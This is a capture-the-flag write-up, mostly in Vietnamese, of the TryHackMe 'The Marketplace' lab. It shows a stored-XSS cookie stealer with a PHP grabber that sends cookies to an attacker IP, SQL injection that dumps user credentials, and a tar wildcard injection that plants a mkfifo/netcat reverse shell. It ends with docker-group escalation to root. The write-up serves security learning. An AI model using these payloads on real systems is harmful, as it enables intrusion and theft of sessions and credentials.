---
title: "Tryhackme - The Marketplace"
date: "2022-02-01"
tags: [
    "web",
    "linux",
    "burpsuite",
    "xss",
    "sqli",
    "ssh",
    "docker"
]
---

The holidays are too long, so I can only return to CTF now. And today I will open the New Year bowl with a machine medium - [Tryhackme - The Marketplace](https://tryhackme.com/room/marketplace)

## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm là quét các cổng đang mở trên machine này.

```python
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW+LVfkwlBgxGqnRWxlY6XtlsYEKfS1B+wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99+twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=
|   256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar
80/tcp    open  http    syn-ack nginx 1.19.2
|_http-title: The Marketplace
| http-robots.txt: 1 disallowed entry 
|_/admin
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.19.2
32768/tcp open  http    syn-ack Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sau 1 lúc xem qua 2 port với http web server, tôi tạm thời chưa tìm được gì đặc biệt, vậy nên tôi sẽ tìm web path với *__dirsearch__*

Sau khi quét web path với cả 2 port kết hợp với phần thu thập thông tin ở trên, tôi có 1 vài ghi chú:

- */login* là trang đăng nhập
- */signup* đùng để đăng ký tài khoản mới, và không kiểm tra trùng tên user
- */new* tạo listing mới
- */item/1* các bài viết được đánh số 1,2,3,4,.... Khi chọn item nào path sẽ trỏ về số thứ tự của item đó
- */message* xem tin nhắn của user. Sau khi thực hiện report thì admin sẽ trả lời và tôi có thể xem trả lời của admin ở trong này
- */contact* xem các liên hệ. */contact/michael* nghĩa là xem liên hệ của *michael*
- */report/1* báo cáo các bài viết theo số thứ tự item phía trên
- */admin* chắc là path của quản trị viên

Vậy nên tôi thử dùng BurpSuite để xem khai có thác được gì từ các path phía trên không. Với phần */report*, request cho tôi 1 cookie

![cookie](2.png)

Với cookie, tôi thử vào [JWT](https://jwt.io/) để decode 

![decode-cookie](3.png)

Tôi đã thử vài các để giả mạo cookie nhưng không có kết quả. Tạm thời note nó lại, tôi sẽ chuyển qua cách khác. Trong */new*, với những phần có thể nhập vào từ bàn phím như thế này, tôi thử vài xss đơn giản

![new-post](4.png)

![xss-payload](5.png)

Vậy là tôi có lỗ hổng XSS ở đây. Tôi sẽ thử lấy cookie của admin bằng cách tạo 1 listing chứa XXS payload và báo cáo nó với quản trị viên. 

Đọc thêm: [Data grabber for XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)

Đầu tiên tạo file *grapper.php*

```python
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

Tạo XSS payload

`<script>document.location='http://IP-remote:port-remote/grabber.php?c='+document.cookie</script>`

![payload](6.png)

Trước khi ấn "Summit Query" thì tạo listener với port 9001

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 9001                      
listening on [any] 9001 ...
connect to [10.18.3.74] from (UNKNOWN) [10.18.3.74] 57770
GET /grabber.php?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTY2MTY3MTUyNX0.8txB8EpTpBDTcHhL-_LzZe4n7zC3exATeCBm_m49tyw HTTP/1.1
Host: 10.18.3.74:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.10.31.207/
Upgrade-Insecure-Requests: 1
```

Sau đó report listing này với quản trị viên để họ trả lời và tôi sẽ có được cookie của họ

Tiếp theo tôi vào path */admin* để thay đổi cookie với BurpSuite

![admin-cookie](7.png)

Vậy là tôi có flag 1.

Tiếp theo, tôi để ý với response này, tôi có ID của từng user, vậy nên tôi đã nghĩ rằng sao không thử vài SQLi với path */admin* và in ra tên của database

![user](8.png)

Sau 1 lúc tìm hiểu về SQLi tôi nhận ra khi query đến database, ID nào đã tồn tại thì nó sẽ in ra thông tin về ID đó và thế là hết. Vậy để database query được câu lệnh SQLi phía sau, tôi phải thêm vào 1 ID chưa có trong db, ở đây tôi đã có ID 1,2,3,4, vậy thì ID chưa được gán thông tin sẽ là 5

Đọc thêm: [SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

![db-query](9.png)

Vậy là tôi có db đang sử dụng là 'marketplace'. Tiếp tục show các tables có trong db này

![tables](10.png)

Tôi có 3 tables ở đây: items, messages và users. Query đến table user để lấy thông tin về các users

![users](11.png)

![user-pass](12.png)

Vậy là tôi có 3 username và password, lưu nó lại. Tiếp theo tôi còn 1 table nữa chưa xem thử đó là 'message'

![message](13.png)

Vậy là tôi có password của 1 user. Thử ssh với 2 user đã biết là *jake* và *michael*

## SSH

```python
┌──(neo㉿kali)-[~]
└─$ ssh jake@10.10.37.209           
The authenticity of host '10.10.37.209 (10.10.37.209)' can't be established.
ED25519 key fingerprint is SHA256:Rl4+lAmQWEhSKHNbPY/BoNdG16/4xcmIXNIlSrBasm0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.37.209' (ED25519) to the list of known hosts.
jake@10.10.37.209's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 28 09:32:13 UTC 2022

  System load:  0.0                Users logged in:                0
  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.37.209
  Memory usage: 31%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1
  Processes:    102

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.

jake@the-marketplace:~$ ls
user.txt
jake@the-marketplace:~$ 
```

## Privilege escalation

`sudo -l`

```python
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
jake@the-marketplace:~$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

Điều này có nghĩa là tôi có thể thêm payload vào file *backup.sh* để khi chạy file này, payload sẽ gọi đến user *michael*. Thêm 1 điều nữa, khi chạy file *backup.sh*, nó sẽ sinh ra 1 file tar. Tôi có nhớ có 1 exploit với tar, nó ở [đây](https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/Tar%20commands%20execution)

Đầu tiên vẫn phải tạo file shell mới chứa payload, sau đó sẽ dùng exploit với tar. Sau đó tạo listener với port 9001: `nc -lnvp 9001` 

Và nó sẽ giống như thế này

```python
jake@the-marketplace:/opt/backups$ echo '#!/bin/bash' > shell.sh
jake@the-marketplace:/opt/backups$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.3.74 9001 >/tmp/f' > shell.sh
jake@the-marketplace:/opt/backups$ chmod +x shell.sh
jake@the-marketplace:/opt/backups$ touch '/opt/backups/--checkpoint=1'
jake@the-marketplace:/opt/backups$ touch '/opt/backups/--checkpoint-action=exec=sh shell.sh'
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
rm: cannot remove '/tmp/f': No such file or directory
```

Sang phía listener

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.171.7] 40864
michael@the-marketplace:/opt/backups$ 
michael@the-marketplace:/opt/backups$ cd
michael@the-marketplace:~$ cd /home/michael/
michael@the-marketplace:/home/michael$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

User *michael* có trong group *docker*. Tôi sẽ thử vào [GTFOBins](https://gtfobins.github.io) xem cách leo thang đặc quyền với *docker*. Với group *docker* tôi sẽ sử dụng SUID

```python
michael@the-marketplace:~$ /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# ls /root/
root.txt
# 
```

Hoàn thành!
